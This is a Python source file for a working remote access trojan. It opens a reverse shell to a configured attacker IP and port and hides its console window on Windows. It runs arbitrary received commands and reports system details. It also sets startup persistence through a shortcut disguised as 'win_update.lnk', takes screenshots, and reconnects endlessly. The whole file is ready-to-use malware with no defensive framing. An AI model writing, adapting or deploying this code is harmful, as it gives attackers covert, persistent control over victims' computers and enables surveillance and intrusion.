import socket
import subprocess
import os
import sys
import time
import platform

# --- Configuration ---
# IMPORTANT: Change this to your attacker's IP address and Port
ATTACKER_HOST = "192.168.1.54"  # Your IP address
ATTACKER_PORT = 4444             # The port you are listening on

def hide_console():
    """Hides the console window on Windows to run silently."""
    if platform.system().lower() == 'windows':
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0) # 0 = SW_HIDE
            # Optional: Also hide from the taskbar
            # ctypes.windll.user32.ShowWindow(whnd, 6) # 6 = SW_MINIMIZE

def execute_command(command):
    """Executes a system command and returns the output."""
    try:
        # Using Popen for more control and to prevent hanging
        proc = subprocess.Popen(command, shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
        output, error = proc.communicate(timeout=15) # 15-second timeout
        
        # Combine stdout and stderr
        result = output.decode('cp850' if platform.system().lower() == 'windows' else 'utf-8', errors='ignore')
        error_result = error.decode('cp850' if platform.system().lower() == 'windows' else 'utf-8', errors='ignore')
        
        return result + error_result

    except subprocess.TimeoutExpired:
        return "[!] Command timed out.\n"
    except Exception as e:
        return f"[!] Error executing command: {str(e)}\n"

def connect_to_attacker():
    """Connects to the attacker and manages the shell session."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_HOST, ATTACKER_PORT))
        
        # Send a confirmation message to the attacker
        s.send(b"[+] Victim shell connected.\n")
        
        while True:
            # Receive command from the attacker
            command = s.recv(4096).decode().strip()

            if not command:
                break # Connection closed by attacker

            # Handle special commands from the nrev controller
            if command.lower() == "exit_shell":
                s.send(b"[+] Shell terminating.\n")
                break
            
            elif command.lower() == "info":
                # Gather system information
                os_info = f"OS: {platform.system()} {platform.release()}\n"
                user_info = f"User: {os.getenv('USER') or os.getenv('USERNAME')}\n"
                host_info = f"Hostname: {socket.gethostname()}\n"
                arch_info = f"Architecture: {platform.machine()}\n"
                s.send((os_info + user_info + host_info + arch_info).encode())

            elif command.lower().startswith("persist"):
                if platform.system().lower() == 'windows':
                    # Get the path of the current script
                    script_path = os.path.realpath(sys.argv[0])
                    startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    shortcut_path = os.path.join(startup_dir, 'win_update.lnk')
                    
                    # Create a VBScript to build the shortcut
                    vb_script = f"""
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "python.exe"
oLink.Arguments = "{script_path}"
oLink.Save
"""
                    # Execute the VBScript
                    proc = subprocess.Popen(['cscript.exe', '/nologo', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = proc.communicate(vb_script.encode())
                    
                    if os.path.exists(shortcut_path):
                        s.send(b"[+] Persistence established in startup folder.\n")
                    else:
                        s.send(b"[!] Failed to establish persistence.\n")
                else:
                    s.send(b"[!] Persistence command is for Windows only.\n")

            elif command.lower().startswith("screenshot"):
                if platform.system().lower() == 'windows':
                    # Use PowerShell to take a screenshot
                    ps_command = """
Add-Type -AssemblyName System.Windows.Forms;
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
$bmp = New-Object System.Drawing.Bitmap $bounds.width, $bounds.height;
$graphics = [System.Drawing.Graphics]::FromImage($bmp);
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.size);
$bmp.Save('$env:TEMP\\screenshot.png');
$graphics.Dispose();
$bmp.Dispose();
"""
                    result = execute_command(f'powershell -c "{ps_command}"')
                    if "Error" not in result:
                        s.send(b"[+] Screenshot saved to %TEMP%\\screenshot.png on victim.\n")
                    else:
                        s.send(result.encode())
                else:
                    # Linux/macOS requires tools like 'scrot' or 'import'
                    s.send(b"[!] Screenshot command requires PowerShell on Windows or 'scrot'/'import' on Linux.\n")

            else:
                # For any other command, execute it and send back the output
                output = execute_command(command)
                s.send(output.encode())

    except socket.error:
        # Connection failed, will be handled by the main loop
        pass
    except Exception as e:
        # Log error to a temp file for debugging, then try to reconnect
        with open(os.path.join(os.getenv('TEMP', '/tmp'), 'vict_err.log'), 'a') as f:
            f.write(f"Error: {str(e)}\n")
    finally:
        if 's' in locals():
            s.close()

def main():
    """Main function to handle reconnection logic."""
    # Attempt to hide the window on start
    hide_console()
    
    reconnect_delay = 5 # Start with a 5-second delay
    
    while True:
        try:
            connect_to_attacker()
        except Exception as e:
            # Log the error if needed
            pass
        
        # If the loop continues, the connection was lost
        print(f"Connection lost. Reconnecting in {reconnect_delay} seconds...") # This will be hidden
        time.sleep(reconnect_delay)
        
        # Exponential backoff to avoid flooding the network
        if reconnect_delay < 60: # Cap the delay at 60 seconds
            reconnect_delay *= 2

if __name__ == "__main__":
    main()

